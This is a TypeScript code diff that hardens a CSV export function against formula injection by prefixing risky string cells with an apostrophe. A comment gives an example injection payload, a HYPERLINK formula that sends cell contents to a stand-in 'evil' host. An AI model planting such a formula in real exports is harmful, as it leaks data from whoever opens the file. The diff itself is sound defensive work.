@@ -46,9 +46,17 @@ export function parseCsvWithHeader(text: string): string[][] {
 export type CsvCell = string | number | boolean | null | undefined;
 
 /** Quote a field per RFC-4180: wrap in quotes + double internal quotes only when
- *  it contains a comma, quote, or newline. null/undefined → "". */
+ *  it contains a comma, quote, or newline. null/undefined → "".
+ *
+ *  Also defuses CSV/formula injection: Excel and Sheets treat a cell that starts with
+ *  = + - @ (or a tab/CR) as a FORMULA, so a customer named `=HYPERLINK("http://evil/?d="&A1)`
+ *  would execute in whoever opens the export. A leading apostrophe forces text — it's the
+ *  standard fix, and Excel doesn't display it. Numbers arrive as numbers (not strings
+ *  starting with "-"), so a negative number is unaffected; a STRING "-5" gets the prefix,
+ *  which is the correct trade (text stays text). */
 export function csvField(v: CsvCell): string {
-  const s = v === null || v === undefined ? "" : String(v);
+  const raw = v === null || v === undefined ? "" : String(v);
+  const s = typeof v === "number" || typeof v === "boolean" || !/^[=+\-@\t\r]/.test(raw) ? raw : `'${raw}`;
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
